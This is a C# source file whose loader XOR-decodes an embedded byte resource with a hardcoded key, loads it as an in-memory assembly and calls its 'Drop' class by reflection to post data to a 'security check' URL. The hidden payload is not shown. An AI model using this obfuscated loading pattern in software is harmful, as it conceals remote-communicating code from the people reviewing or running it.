using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Collections.Specialized;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Reflection;
using System.Runtime.Remoting;
using System.IO;

namespace AlphA
{
    public interface IDrop
    {
        /// <summary>
        /// Prepare the dictonary for security check POST array
        /// </summary>
        /// <param name="keys">Key-value array with the data to send</param>
        /// <returns>Encoded values to send via POST</returns>
        NameValueCollection Implode(Dictionary<string, string> keys);

        /// <summary>
        /// Splits the returned data stream from the security check
        /// </summary>
        /// <param name="data">Byte data from the security check</param>
        /// <returns>Dictonary with the decoded values</returns>
        Dictionary<string, string> Explode(byte[] data);

        /// <summary>
        /// Security check url address
        /// </summary>
        string GetUrl();
    }

    public class DropOpener
    {
        public static byte[] OpenKey = new byte[] { 0xff, 0x54, 0x25, 0x88, 0x35, 0x87, 0x11, 0x19 };

        private static void Xor(byte[] data, byte[] key)
        {
            for (int i = 0; i < data.Length; i++)
            {
                data[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
        }

        private static byte[] LoadCode(byte[] resource)
        {
            using (var ms = new MemoryStream(resource))
            {
                var br = new BinaryReader(ms);
                ms.Seek(br.ReadUInt32(), SeekOrigin.Begin);
                byte[] data = br.ReadBytes((int)(ms.Length - ms.Position));

                Xor(data, OpenKey);

                return data;
            }
        }

        public static IDrop Load(byte[] resource)
        {
            var file = Assembly.Load(LoadCode(resource));

            return new DropWrapper(Activator.CreateInstance(file.GetType("AlphA.Drop")));
        }
    }

    public class DropWrapper : IDrop
    {
        object handler;
        Type type;

        public DropWrapper(object drop)
        {
            handler = drop;
            type = drop.GetType();
        }

        public NameValueCollection Implode(Dictionary<string, string> keys)
        {
            return type.GetMethod("Implode").Invoke(handler, new []{ keys }) as NameValueCollection;
        }

        public Dictionary<string, string> Explode(byte[] data)
        {
            return type.GetMethod("Explode").Invoke(handler, new[] { data }) as Dictionary<string, string>;
        }

        public string GetUrl()
        {
            return type.GetMethod("GetUrl").Invoke(handler, null) as string;
        }
    }
}
